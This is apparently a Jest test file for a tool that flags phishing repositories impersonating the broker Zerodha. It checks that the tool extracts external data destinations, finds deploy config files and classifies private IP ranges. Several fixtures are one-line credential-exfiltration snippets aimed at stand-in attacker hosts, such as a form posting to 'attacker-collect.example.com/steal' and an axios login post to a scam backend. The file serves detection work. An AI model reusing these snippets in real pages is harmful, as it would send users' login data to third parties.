import {
  extractDataDestinations,
  findDeployConfigFiles,
  isPrivateOrLoopbackIPv4,
} from './destination.util';
import { RepoAnalysisContext } from './rule.types';

const baseCtx = (
  overrides: Partial<RepoAnalysisContext> = {},
): RepoAnalysisContext => ({
  fullName: 'evil/zerodha-login',
  owner: 'evil',
  name: 'zerodha-login',
  description: '',
  topics: [],
  language: 'JavaScript',
  stars: 0,
  forks: 0,
  isFork: false,
  filePaths: [],
  readmeText: '',
  smallFileTexts: [],
  ...overrides,
});

describe('extractDataDestinations', () => {
  it('finds a form action pointing at an external domain', () => {
    const ctx = baseCtx({
      smallFileTexts: [
        {
          path: 'index.html',
          content: '<form action="https://attacker-collect.example.com/steal">',
        },
      ],
    });
    const results = extractDataDestinations(ctx);
    expect(results).toEqual([
      expect.objectContaining({
        hostname: 'attacker-collect.example.com',
        source: 'index.html',
      }),
    ]);
  });

  it('finds a fetch/axios call destination', () => {
    const ctx = baseCtx({
      smallFileTexts: [
        {
          path: 'src/login.js',
          content:
            'axios.post("https://scam-backend.example.net/api/login", data)',
        },
      ],
    });
    const results = extractDataDestinations(ctx);
    expect(results.some((r) => r.hostname === 'scam-backend.example.net')).toBe(
      true,
    );
  });

  it('finds an env-style API_URL assignment', () => {
    const ctx = baseCtx({
      smallFileTexts: [
        {
          path: '.env.example',
          content: 'API_URL=https://sink.example.org/collect',
        },
      ],
    });
    const results = extractDataDestinations(ctx);
    expect(results.some((r) => r.hostname === 'sink.example.org')).toBe(true);
  });

  it('excludes well-known benign infrastructure domains', () => {
    const ctx = baseCtx({
      smallFileTexts: [
        {
          path: 'index.html',
          content:
            '<form action="https://fonts.googleapis.com/css">\n' +
            'fetch("https://www.google-analytics.com/collect")',
        },
      ],
    });
    expect(extractDataDestinations(ctx)).toEqual([]);
  });

  it("excludes the brand's own known domain (from keywords/aliases)", () => {
    const ctx = baseCtx({
      matchedBrandName: 'Zerodha',
      matchedBrandAliases: ['zerodha'],
      matchedBrandKeywords: ['zerodha.com'],
      smallFileTexts: [
        {
          path: 'src/api.js',
          content: 'fetch("https://zerodha.com/api/login")',
        },
      ],
    });
    expect(extractDataDestinations(ctx)).toEqual([]);
  });

  it("excludes a subdomain of the brand's own domain even with no configured domain alias/keyword (regression: kite.zerodha.com wrongly flagged live)", () => {
    const ctx = baseCtx({
      matchedBrandName: 'Zerodha',
      matchedBrandAliases: [],
      matchedBrandKeywords: ['login', 'otp'],
      smallFileTexts: [
        {
          path: 'lib/zerodha.ts',
          content: 'fetch("https://kite.zerodha.com/session/token")',
        },
      ],
    });
    expect(extractDataDestinations(ctx)).toEqual([]);
  });

  it('does NOT exclude a lookalike domain that merely contains the brand name', () => {
    const ctx = baseCtx({
      matchedBrandName: 'Zerodha',
      smallFileTexts: [
        {
          path: 'src/api.js',
          content: 'fetch("https://zerodha-clone.example.com/api/login")',
        },
      ],
    });
    const results = extractDataDestinations(ctx);
    expect(
      results.some((r) => r.hostname === 'zerodha-clone.example.com'),
    ).toBe(true);
  });

  it('ignores relative paths with no external host', () => {
    const ctx = baseCtx({
      smallFileTexts: [{ path: 'src/api.js', content: 'fetch("/api/login")' }],
    });
    expect(extractDataDestinations(ctx)).toEqual([]);
  });

  it('does not report the same hostname twice', () => {
    const ctx = baseCtx({
      smallFileTexts: [
        {
          path: 'src/a.js',
          content: 'fetch("https://sink.example.com/login")',
        },
        {
          path: 'src/b.js',
          content: 'fetch("https://sink.example.com/register")',
        },
      ],
    });
    expect(extractDataDestinations(ctx)).toHaveLength(1);
  });

  it('caps results at a reasonable maximum', () => {
    const smallFileTexts = Array.from({ length: 12 }, (_, i) => ({
      path: `src/f${i}.js`,
      content: `fetch("https://sink${i}.example.com/x")`,
    }));
    const ctx = baseCtx({ smallFileTexts });
    expect(extractDataDestinations(ctx).length).toBeLessThanOrEqual(8);
  });
});

describe('findDeployConfigFiles', () => {
  it('detects known deploy config files anywhere in the tree', () => {
    const found = findDeployConfigFiles([
      'src/index.js',
      'frontend/vercel.json',
      'Procfile',
    ]);
    expect(found).toEqual(['vercel.json', 'Procfile']);
  });

  it('returns an empty array when nothing matches', () => {
    expect(findDeployConfigFiles(['src/index.js', 'README.md'])).toEqual([]);
  });
});

describe('isPrivateOrLoopbackIPv4', () => {
  it('flags loopback, RFC1918, and link-local ranges', () => {
    expect(isPrivateOrLoopbackIPv4('127.0.0.1')).toBe(true);
    expect(isPrivateOrLoopbackIPv4('10.0.0.5')).toBe(true);
    expect(isPrivateOrLoopbackIPv4('172.16.0.1')).toBe(true);
    expect(isPrivateOrLoopbackIPv4('172.31.255.255')).toBe(true);
    expect(isPrivateOrLoopbackIPv4('192.168.1.1')).toBe(true);
    expect(isPrivateOrLoopbackIPv4('169.254.1.1')).toBe(true);
    expect(isPrivateOrLoopbackIPv4('0.0.0.0')).toBe(true);
  });

  it('does not flag public addresses', () => {
    expect(isPrivateOrLoopbackIPv4('8.8.8.8')).toBe(false);
    expect(isPrivateOrLoopbackIPv4('172.15.0.1')).toBe(false);
    expect(isPrivateOrLoopbackIPv4('172.32.0.1')).toBe(false);
    expect(isPrivateOrLoopbackIPv4('93.184.216.34')).toBe(false);
  });

  it('returns false for malformed input rather than throwing', () => {
    expect(isPrivateOrLoopbackIPv4('not-an-ip')).toBe(false);
    expect(isPrivateOrLoopbackIPv4('1.2.3')).toBe(false);
  });
});
